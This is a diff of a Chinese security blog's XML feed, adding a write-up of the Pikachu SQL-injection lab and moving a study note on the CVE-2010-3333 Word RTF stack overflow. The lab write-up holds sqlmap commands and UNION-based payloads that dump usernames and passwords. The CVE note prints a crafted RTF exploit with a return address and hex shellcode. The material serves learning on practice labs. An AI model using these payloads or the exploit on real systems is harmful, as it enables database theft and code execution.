@@ -4,6 +4,29 @@
   
   
   <entry>
+    <title>pikachu-SQL注入</title>
+    <link href="/2022/08/14/pikachu-SQL%E6%B3%A8%E5%85%A5/"/>
+    <url>/2022/08/14/pikachu-SQL%E6%B3%A8%E5%85%A5/</url>
+    
+    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>数据库注入漏洞</p><p>SQL注入漏洞形成原因：在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到sql语句中后，被当作sql语句的一部分执行，从而导致数据库受损（被脱库、被删除、甚至整个服务器权限沦陷）防止SQL注入漏洞的策略：</p><p>1、对传进SQL语句里面的变量进行过滤，不允许危险字符传入</p><p>2、使用参数化（Parameterized Query 或 Parameterized Statement）</p><h1 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h1><p><img src="https://s2.loli.net/2022/08/11/OxedYC8Z3TW6mhi.png" alt="图片.png"></p><p>随便提交，抓包可知，是post方式提交的参数为</p><pre><code class="hljs">id=2&amp;submit=%E6%9F%A5%E8%AF%A2</code></pre><p>使用sqlmap跑post方式时的格式为：</p><pre><code class="hljs">python2 sqlmap.py ‐u "&lt;url&gt;" ‐‐data="&lt;post提交的参数&gt;" ‐&lt;参数&gt;</code></pre><p>1、使用sqlmap跑数据库</p><pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_id.php" ‐‐data="id=2&amp;submit=%E6%9F%A5%E8%AF%A2" ‐f ‐‐dbms mysql ‐‐dbs ‐‐batch</code></pre><p>注释：</p><ul><li>‐‐dbms 探测数据库是什么 ‐‐dbms mysql 指定数据库类型为mysql数据库</li><li>‐‐dbs 当用户有权读取时，列出所有的数据库</li><li>‐‐batch 该参数使用后不需要用户输入，将会使用sqlmap给的默认提示走下去</li></ul><p><img src="https://s2.loli.net/2022/08/11/OcN91PyeLSb6dZ2.png" alt="图片.png"></p><p>2、查数据库pikachu下的表</p><pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_id.php" ‐‐data="id=2&amp;submit=%E6%9F%A5%E8%AF%A2" ‐f ‐‐dbms mysql ‐D pikachu ‐‐tables ‐‐batch</code></pre><p>注释：</p><ul><li>‐D pikachu 指定数据库pikachu</li><li>‐‐tables 当有权限读取pikachu数据库中的表tables时，读取出表</li></ul><p><img src="https://s2.loli.net/2022/08/11/Z5tUei9paG8COwq.png" alt="图片.png"></p><p>3、获取表users中的列</p><pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_id.php" ‐‐data="id=2&amp;submit=%E6%9F%A5%E8%AF%A2" ‐f ‐‐dbms mysql ‐D pikachu ‐T users ‐‐columns ‐‐batch</code></pre><p>注释：</p><ul><li>‐T users 指定表明users</li><li>‐‐colmns 当有权限读取表users中的列的时候读取表users中的列。</li><li><img src="https://s2.loli.net/2022/08/11/HGPmW5npascRi78.png" alt="图片.png"></li></ul><p>4、获取列username和password中的字段内容</p><pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_id.php" ‐‐data="id=2&amp;submit=%E6%9F%A5%E8%AF%A2" ‐f ‐‐dbms mysql ‐D pikachu ‐T users ‐C username,password ‐‐dump ‐‐batch</code></pre><p>注释：</p><ul><li>‐C username,password 指定读取列username和password中的字段内容</li><li>‐‐dump 抛出前面指定内容</li></ul><p><img src="https://s2.loli.net/2022/08/11/gzPAj4DCbM7aeX5.png" alt="图片.png"></p><h1 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h1><p>1、提交，抓包</p><p>2、提交恒等语句可以查询到所有的数据信息</p><p><img src="https://s2.loli.net/2022/08/11/Mb1gFvQZJKzuoPj.png" alt="图片.png"></p><h1 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h1><p><img src="https://s2.loli.net/2022/08/11/1woM6UtT2yZej4v.png" alt="图片.png"></p><p><img src="https://s2.loli.net/2022/08/11/zGdbRT8eLB5uE2q.png" alt="图片.png"></p><p>GET方法取表，抓包：</p><p><img src="https://s2.loli.net/2022/08/11/YCWcI9t8lphZfLj.png" alt="图片.png"></p><p>参数返回：<code> GET /pikachu/vul/sqli/sqli_str.php?name=&amp;submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1</code></p><p>使用sqlmap跑：</p><p>1、查数据库</p><pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" ‐‐dbms mysql ‐‐dbs </code></pre><p><img src="https://s2.loli.net/2022/08/11/oMtHBAC7XWPq5Os.png" alt="图片.png"></p><p>2、查表</p><pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" ‐‐dbms mysql ‐‐dbs ‐‐batch</code></pre><p><img src="https://s2.loli.net/2022/08/11/e9CPAYrHTNyW7fg.png" alt="图片.png"></p><p>3、查列</p><pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" ‐‐dbms mysql ‐D pikachu ‐T users ‐‐columns ‐‐batch</code></pre><p><img src="https://s2.loli.net/2022/08/11/jImLuBZw6kV9oHe.png" alt="图片.png"></p><p>4、查字段</p><pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" ‐‐dbms mysql ‐D pikachu ‐T users ‐C username,password ‐‐dump ‐‐batch</code></pre><p><img src="https://s2.loli.net/2022/08/12/ns6cb125QWuw4K8.png" alt="图片.png"></p><h1 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h1><p>为方便用户，提供搜索功能，但是因为没对变量过滤，导致漏洞，分为post get，get型一般用在网站上的搜索，post用于用户名登录，搜索型注入又称文本框注入</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><pre><code class="hljs">$sql="select * from user where password like '%$pwd%' order by password";</code></pre><p>%匹配任何字符，这句sql语句就是基于用户输入的pws在users表中找到相应的password。</p><p>如果用户端输入: <code>and 1=1 and '%'=</code><br>则会变成：</p><pre><code class="hljs">$sql="select * from user where password like '%fendo'and 1=1 and '%'='%' order by password";</code></pre><p>存在sql注入。<br>题</p><p><img src="https://s2.loli.net/2022/08/12/83clNIzeqxQC95R.png" alt="图片.png"></p><p>输入一个单引号’</p><p><img src="https://s2.loli.net/2022/08/12/sjbvRBf8hX9Trik.png" alt="图片.png"></p><p>报错，因为单引号导致语句%’没闭合。</p><p>输入 <code>'and 1=1 and '%'='</code> ,此时语句变为：</p><pre><code class="hljs">'%' and 1=1 and '%'='%' order by password</code></pre><p><img src="https://s2.loli.net/2022/08/12/cVtYLA9HiWvgpKN.png" alt="图片.png"></p><p>还可以：</p><ul><li>%’ and 1=1‐‐’</li><li>‘ and 1=1#</li><li>%’ and 1=1 and ‘%’=’</li></ul><p>可输入 <code>' and 1=1 order by x# </code>通过order by x 确定字段数，输入<code>' and 1=1 order by 3#</code>返回正常页面</p><p>输入<code>order by 4#</code>返回报错，说明字段数为3.</p><p>输入 <code>%' and 1=2 union select 1,2,3#</code></p><p><img src="https://s2.loli.net/2022/08/12/DHQ1uVzSeAFW62K.png" alt="图片.png"></p><p>（1）1，2，3都可以回显，输入 %’ and 1=2 union select 1,2,(database())# 可爆出当前使用数据库pikachu</p><p>（2）输入 %’ and 1=2 union select 1,2,table_name from information_schema.columns where table_schema=’pikachu’# 得到<br>pikachu数据库下所有表名。</p><p>（3）选择users表，输入 %’ and 1=2 union select 1,2,column_name from information_schema.columns where table_name=’users’# 得到users表下的所有字段名</p><p>（4）输入 %’ and 1=2 union select 1,2,username from pikachu.users#</p><p>(顶多跟着网上教程做了一遍，挺懵逼的其实。–2020.1.7)</p><h1 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h1><p>xx型注入是什么鬼，看到提示笑死</p><p><img src="https://s2.loli.net/2022/08/12/tj3gv96SDb1eVN7.png" alt="图片.png"></p><p>随便输入字符抓个包，是GET型请求，输入特殊字符<code>'"&lt;&gt;666</code>,回显报错.</p><p>尝试闭合一下：<code> #'&gt; &lt;script&gt;alert("XSS")&lt;/script&gt;</code></p><p>哎嗨！成功弹出xss，我真是进步了。</p><p>差点忘记这是sql注入了，输入一下万能恒等式：<code> ' and 1=1 '%'='</code></p><p>回显报错，有戏，但是接下来要怎么构造呢？我先看一下前端代码吧。这是从url那个name去获取到输入的，前端代码没啥用，我去看一下后台吧。</p><p><img src="https://s2.loli.net/2022/08/12/cenBE4stSj1IKx7.png" alt="图片.png"></p><p>应该是这里了，分析一下，没看懂，注意到那个$query后面的一串字符串，尝试了几个，失败，果断不浪费时间找wp<br>吧。</p><p>1、传输方式为get，传输参数为<code> name=a&amp;submit=%E6%9F%A5%E8%AF%A</code></p><p>2、测试使其闭合的符号：’ ” &lt;&gt;&amp; –+<br>单引号会报错，初步推测使用单引号使其闭合</p><p>3、利用联合查询：<code> a') union select 1,2#</code></p><p>爆出数据库名字：<code> a') union select database(),2 #</code></p><p>爆出<br>users：<code> a') union select 1,group_concat(table_name) from information_schema.tables where table_schema='pikachu' #</code></p><p>查</p><p>列：<code> a') union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #</code></p><p>查字段：<code> a') union select 1,concat(username,password) from pikachu.users #</code></p><p><img src="https://s2.loli.net/2022/08/12/ZAs93zclEUeLY1q.png" alt="图片.png"></p><h1 id="quot-insert-update-quot-注入"><a href="#quot-insert-update-quot-注入" class="headerlink" title="&quot;insert/update&quot;注入"></a><code>"insert/update"</code>注入</h1>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>WEB</tag>
+      
+      <tag>pikachu</tag>
+      
+      <tag>SQL注入</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Python学习2</title>
     <link href="/2022/08/13/python%E5%AD%A6%E4%B9%A02/"/>
     <url>/2022/08/13/python%E5%AD%A6%E4%B9%A02/</url>
@@ -488,25 +511,6 @@
   
   
   <entry>
-    <title>漏洞战争学习笔记2：CVE-2010-3333</title>
-    <link href="/2022/08/09/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02%EF%BC%9ACVE-2010-3333/"/>
-    <url>/2022/08/09/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02%EF%BC%9ACVE-2010-3333/</url>
-    
-    <content type="html"><![CDATA[<h2 id="0x01-分析环境"><a href="#0x01-分析环境" class="headerlink" title="0x01 分析环境"></a>0x01 分析环境</h2><p>os:由于笔者实在没有找到大佬们使用的目标文件office word 2003 11.5604.5606,只有11.8169.8172，但是应该只要是2003 sp3的应该就问题不大。</p><p>操作系统：windows XP SP3<br>虚拟机：VM<br>调试器：WinDbg、OD、IDA<br>office:office word 2003 11.8169.8172</p><h2 id="0x02-漏洞描述"><a href="#0x02-漏洞描述" class="headerlink" title="0x02 漏洞描述"></a>0x02 漏洞描述</h2><p>oddice xp sp3、2003 sp3、2007 sp2、2010等多个版本的office软件中的Open XML文件格式转换器存在栈溢出漏洞，主要是在处理RTF的”pFragments”属性时存在栈溢出，导致远程攻击者可以借助特制的RTF数据执行任意代码，因此该漏洞又名”RTF栈缓冲区溢出漏洞”。</p><p>office word 2003中的MSO.dll库在解析RTF文档的绘图pFRagments属性时完全信任其数据，未做任何检查便将数据复制到栈中，存在了栈溢出的可能，导致用户打开精心构造的RTF文件时就有可能导致执行任意代码。</p><h2 id="0x03-分析过程"><a href="#0x03-分析过程" class="headerlink" title="0x03 分析过程"></a>0x03 分析过程</h2><p>用Metasploit生成测试样本msf.rtf。</p><p><img src="https://i.loli.net/2020/07/31/GPUKdY8nFfENx5y.png" alt="生成msf.PNG"></p><p>运行WinDbg附加Word 2003，但是每次都是还没有打开测试样本的时候，windbg就已经报错了，我裂开了呀。然后看报错是ntdll.dll文件符号文件无法找到，那我下载一个弄，结果并没有缺失，我又裂开了！</p><p><img src="https://i.loli.net/2020/07/31/ilXRZynC2UDtJ9T.png" alt="裂开.PNG"></p><p>[待续]</p><p>打开测试样本，WinDbg捕获异常，循环赋值内存数据到栈空间时，未检测复制的内存大小，导致覆盖到edi（0x130000）开始的不可写页面,触发异常的指令位于30e9eb88,当前栈已被样本生成的垃圾数据覆盖。</p><ul><li>g</li><li>kb</li></ul><p>在30e9eb88处下断，重新打开测试样本，断下来后通过kb指令得到的信息进行回溯，<br>结合IDA，可知调用函数及其执行流程：30f4cc5d-&gt;30f4cc93 call 30e9eb62-&gt;30e9eb88</p><p>通过跟踪分析可发现，复制的数据大小由样本中的某一处决定，如下面两张图，前面的4在后面的计算中会变成0，并且将c8ac除以4（因为操作的大小为DWORD</p><ul><li>p</li></ul><p>为了确定该栈溢出漏洞能劫持程序运行流程，自己构造一个长度偏小（防止触发访问异常）但又能覆盖返回地址的测试样本, 打开该样本，WinDbg捕获异常，eip已被改为111111，至此我们可以确定该栈溢出漏洞可被利用</p><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><h3 id="覆盖返回地址"><a href="#覆盖返回地址" class="headerlink" title="覆盖返回地址"></a>覆盖返回地址</h3><p>找到覆盖成返回地址的地方，修改成0x7ffa4512（jmp esp），再在后面添加一些0x90，然后运行起来还没到执行到栈中就会崩溃，推测前面测试样本太小没怎么污染到栈空间，一开始还想着还原栈空间，但是重新分析了测试样本后发现其在下图中30F4CB29处是实现跳转的，而加了一些0x90后不跳转，并进行了一些与栈相关的操作，从而导致崩溃</p><h3 id="布置shellcode"><a href="#布置shellcode" class="headerlink" title="布置shellcode"></a>布置shellcode</h3><p>分析了下，是栈中多了一些0x90导致原来的一堆00不见了，所以需要在返回地址后面加40个00，这样就可以执行到栈中了。在后面加入shellcode，重新运行并成功进入shellcode，<br>布置shellcode如下：</p><p>z<br>{\rtf1{}{\shp{*\shpinst{\sp{\sn pfragments}{\sv1;1;11111111111111111111111111111111111111111111111111111245fa7f0000000000000000000000000000000000000000fc686a0a381e686389d14f683274910c8bf48d7ef433dbb7042be366bb33325368757365725433d2648b5a308b4b0c8b491c8b098b6908ad3d6a0a381e750595ff57f895608b453c8b4c057803cd8b592003dd33ff478b34bb03f5990fbe063ac47408c1ca0703d046ebf13b54241c75e48b592403dd668b3c7b8b591c03dd032cbb955fab57613d6a0a381e75a933db536875730000687267656f68524e476f8bc453505053ff57fc53ff57f8}}}}}<br>```</p>]]></content>
-    
-    
-    
-    <tags>
-      
-      <tag>漏洞战争</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
     <title>各类型软件漏洞合集</title>
     <link href="/2022/08/09/%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/"/>
     <url>/2022/08/09/%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/</url>
@@ -518,6 +522,25 @@
     <tags>
       
       <tag>漏洞</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>漏洞战争学习笔记2：CVE-2010-3333</title>
+    <link href="/2022/08/09/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02%EF%BC%9ACVE-2010-3333/"/>
+    <url>/2022/08/09/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02%EF%BC%9ACVE-2010-3333/</url>
+    
+    <content type="html"><![CDATA[<h2 id="0x01-分析环境"><a href="#0x01-分析环境" class="headerlink" title="0x01 分析环境"></a>0x01 分析环境</h2><p>os:由于笔者实在没有找到大佬们使用的目标文件office word 2003 11.5604.5606,只有11.8169.8172，但是应该只要是2003 sp3的应该就问题不大。</p><p>操作系统：windows XP SP3<br>虚拟机：VM<br>调试器：WinDbg、OD、IDA<br>office:office word 2003 11.8169.8172</p><h2 id="0x02-漏洞描述"><a href="#0x02-漏洞描述" class="headerlink" title="0x02 漏洞描述"></a>0x02 漏洞描述</h2><p>oddice xp sp3、2003 sp3、2007 sp2、2010等多个版本的office软件中的Open XML文件格式转换器存在栈溢出漏洞，主要是在处理RTF的”pFragments”属性时存在栈溢出，导致远程攻击者可以借助特制的RTF数据执行任意代码，因此该漏洞又名”RTF栈缓冲区溢出漏洞”。</p><p>office word 2003中的MSO.dll库在解析RTF文档的绘图pFRagments属性时完全信任其数据，未做任何检查便将数据复制到栈中，存在了栈溢出的可能，导致用户打开精心构造的RTF文件时就有可能导致执行任意代码。</p><h2 id="0x03-分析过程"><a href="#0x03-分析过程" class="headerlink" title="0x03 分析过程"></a>0x03 分析过程</h2><p>用Metasploit生成测试样本msf.rtf。</p><p><img src="https://i.loli.net/2020/07/31/GPUKdY8nFfENx5y.png" alt="生成msf.PNG"></p><p>运行WinDbg附加Word 2003，但是每次都是还没有打开测试样本的时候，windbg就已经报错了，我裂开了呀。然后看报错是ntdll.dll文件符号文件无法找到，那我下载一个弄，结果并没有缺失，我又裂开了！</p><p><img src="https://i.loli.net/2020/07/31/ilXRZynC2UDtJ9T.png" alt="裂开.PNG"></p><p>[待续]</p><p>打开测试样本，WinDbg捕获异常，循环赋值内存数据到栈空间时，未检测复制的内存大小，导致覆盖到edi（0x130000）开始的不可写页面,触发异常的指令位于30e9eb88,当前栈已被样本生成的垃圾数据覆盖。</p><ul><li>g</li><li>kb</li></ul><p>在30e9eb88处下断，重新打开测试样本，断下来后通过kb指令得到的信息进行回溯，<br>结合IDA，可知调用函数及其执行流程：30f4cc5d-&gt;30f4cc93 call 30e9eb62-&gt;30e9eb88</p><p>通过跟踪分析可发现，复制的数据大小由样本中的某一处决定，如下面两张图，前面的4在后面的计算中会变成0，并且将c8ac除以4（因为操作的大小为DWORD</p><ul><li>p</li></ul><p>为了确定该栈溢出漏洞能劫持程序运行流程，自己构造一个长度偏小（防止触发访问异常）但又能覆盖返回地址的测试样本, 打开该样本，WinDbg捕获异常，eip已被改为111111，至此我们可以确定该栈溢出漏洞可被利用</p><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><h3 id="覆盖返回地址"><a href="#覆盖返回地址" class="headerlink" title="覆盖返回地址"></a>覆盖返回地址</h3><p>找到覆盖成返回地址的地方，修改成0x7ffa4512（jmp esp），再在后面添加一些0x90，然后运行起来还没到执行到栈中就会崩溃，推测前面测试样本太小没怎么污染到栈空间，一开始还想着还原栈空间，但是重新分析了测试样本后发现其在下图中30F4CB29处是实现跳转的，而加了一些0x90后不跳转，并进行了一些与栈相关的操作，从而导致崩溃</p><h3 id="布置shellcode"><a href="#布置shellcode" class="headerlink" title="布置shellcode"></a>布置shellcode</h3><p>分析了下，是栈中多了一些0x90导致原来的一堆00不见了，所以需要在返回地址后面加40个00，这样就可以执行到栈中了。在后面加入shellcode，重新运行并成功进入shellcode，<br>布置shellcode如下：</p><p>z<br>{\rtf1{}{\shp{*\shpinst{\sp{\sn pfragments}{\sv1;1;11111111111111111111111111111111111111111111111111111245fa7f0000000000000000000000000000000000000000fc686a0a381e686389d14f683274910c8bf48d7ef433dbb7042be366bb33325368757365725433d2648b5a308b4b0c8b491c8b098b6908ad3d6a0a381e750595ff57f895608b453c8b4c057803cd8b592003dd33ff478b34bb03f5990fbe063ac47408c1ca0703d046ebf13b54241c75e48b592403dd668b3c7b8b591c03dd032cbb955fab57613d6a0a381e75a933db536875730000687267656f68524e476f8bc453505053ff57fc53ff57f8}}}}}<br>```</p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>漏洞战争</tag>
       
     </tags>
     
